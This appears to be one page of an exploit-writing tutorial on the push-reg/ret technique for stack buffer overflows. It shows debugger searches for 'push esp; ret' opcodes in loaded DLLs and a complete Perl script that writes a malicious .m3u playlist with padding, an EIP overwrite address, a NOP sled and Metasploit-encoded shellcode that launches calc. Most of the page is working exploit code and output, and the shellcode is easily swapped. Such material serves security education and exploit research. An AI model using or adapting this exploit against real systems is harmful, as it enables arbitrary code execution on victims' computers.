<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>PUSH RET</title>
</head><body>Push ret is somewhat similar to call [reg]. If one of the registers is directly pointing at your shellcode, and if for some reason you cannot use a jmp [reg] to jump to the shellcode, then you could<br/>
<ul><li>put the address of that register on the stack. It will sit on top of the stack. </li>
<li>ret (which will take that address back from the stack and jump to it) </li>
</ul>
<br/>
In order to make this work, you need to overwrite EIP with the address of a push [reg] + ret sequence in one of the dll’s.<br/>
<br/>
Suppose the shellcode is located directly at ESP. You need to find the opcode for ‘push esp’ and the opcode for ‘ret’ first<br/>
<br/>
0:000&gt; u 000ff7ae<br/>
+0xff79d:<br/>
000ff7ae 54       push  esp<br/>
000ff7af c3       ret<br/>
<br/>
opcode sequence is 0x54,0xc3<br/>
<br/>
Search for this opcode :<br/>
<br/>
0:000&gt; s 01a90000 l 01dff000 54 c3<br/>
01aa57f6 54 c3 90 90 90 90 90 90-90 90 8b 44 24 08 85 c0 T..........D$...<br/>
01b31d88 54 c3 fe ff 85 c0 74 5d-53 8b 5c 24 30 57 8d 4c T.....t]S.\$0W.L<br/>
01b5cd65 54 c3 8b 87 33 05 00 00-83 f8 06 0f 85 92 01 00 T...3...........<br/>
01b5cf2f 54 c3 8b 4c 24 58 8b c6-5f 5e 5d 5b 64 89 0d 00 T..L$X.._^][d...<br/>
01b5cf44 54 c3 90 90 90 90 90 90-90 90 90 90 8a 81 da 04 T...............<br/>
01bbbb3e 54 c3 8b 4c 24 50 5e 33-c0 5b 64 89 0d 00 00 00 T..L$P^3.[d.....<br/>
01bbbb51 54 c3 90 90 90 90 90 90-90 90 90 90 90 90 90 6a T..............j<br/>
01bf2aba 54 c3 0c 8b 74 24 20 39-32 73 09 40 83 c2 08 41 T...t$ 92s.@...A<br/>
01c0f6b4 54 c3 b8 0e 00 07 80 8b-4c 24 54 5e 5d 5b 64 89 T.......L$T^][d.<br/>
01c0f6cb 54 c3 90 90 90 64 a1 00-00 00 00 6a ff 68 3b 84 T....d.....j.h;.<br/>
01c692aa 54 c3 90 90 90 90 8b 44-24 04 8b 4c 24 08 8b 54 T......D$..L$..T<br/>
01d35a40 54 c3 c8 3d 10 e4 38 14-7a f9 ce f1 52 15 80 d8 T..=..8.z...R...<br/>
01d4daa7 54 c3 9f 4d 68 ce ca 2f-32 f2 d5 df 1b 8f fc 56 T..Mh../2......V<br/>
01d55edb 54 c3 9f 4d 68 ce ca 2f-32 f2 d5 df 1b 8f fc 56 T..Mh../2......V<br/>
01d649c7 54 c3 9f 4d 68 ce ca 2f-32 f2 d5 df 1b 8f fc 56 T..Mh../2......V<br/>
01d73406 54 c3 d3 2d d3 c3 3a b3-83 c3 ab b6 b2 c3 0a 20 T..-..:........<br/>
01d74526 54 c3 da 4c 3b 43 11 e7-54 c3 cc 36 bb c3 f8 63 T..L;C..T..6...c<br/>
01d7452e 54 c3 cc 36 bb c3 f8 63-3b 44 d8 00 d1 43 f5 f3 T..6...c;D...C..<br/>
01d74b26 54 c3 ca 63 f0 c2 f7 86-77 42 38 98 92 42 7e 1d T..c....wB8..B~.<br/>
031d3b18 54 c3 f6 ff 54 c3 f6 ff-4f bd f0 ff 00 6c 9f ff T...T...O....l..<br/>
031d3b1c 54 c3 f6 ff 4f bd f0 ff-00 6c 9f ff 30 ac d6 ff T...O....l..0...<br/>
<br/>
Craft your exploit and run :<br/>
<br/>
my $file= &quot;test1.m3u&quot;;<br/>
my $junk= &quot;A&quot; x 26094;<br/>
<br/>
my $eip = pack('V',0x01aa57f6); #overwrite EIP with push esp, ret<br/>
<br/>
my $prependesp = &quot;XXXX&quot;; #add 4 bytes so ESP points at beginning of shellcode bytes<br/>
<br/>
my $shellcode = &quot;\x90&quot; x 25;  #start shellcode with some NOPS<br/>
<br/>
# windows/exec - 303 bytes<br/>
# http://www.metasploit.com<br/>
# Encoder: x86/alpha_upper<br/>
# EXITFUNC=seh, CMD=calc<br/>
<br/>
$shellcode = $shellcode . &quot;\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49&quot; .<br/>
&quot;\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56&quot; .<br/>
&quot;\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41&quot; .<br/>
&quot;\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42&quot; .<br/>
&quot;\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a&quot; .<br/>
&quot;\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47&quot; .<br/>
&quot;\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c&quot; .<br/>
&quot;\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a&quot; .<br/>
&quot;\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50&quot; .<br/>
&quot;\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43&quot; .<br/>
&quot;\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a&quot; .<br/>
&quot;\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c&quot; .<br/>
&quot;\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44&quot; .<br/>
&quot;\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c&quot; .<br/>
&quot;\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47&quot; .<br/>
&quot;\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50&quot; .<br/>
&quot;\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44&quot; .<br/>
&quot;\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43&quot; .<br/>
&quot;\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42&quot; .<br/>
&quot;\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b&quot; .<br/>
&quot;\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45&quot; .<br/>
&quot;\x31\x42\x4c\x42\x43\x45\x50\x41\x41&quot;;<br/>
<br/>
open($FILE,&quot;&gt;$file&quot;);<br/>
print $FILE $junk.$eip.$prependesp.$shellcode;<br/>
close($FILE);<br/>
print &quot;m3u File Created successfully\n&quot;;<br/>
<br/>
pwned again !<br/>
<br/>
</body></html>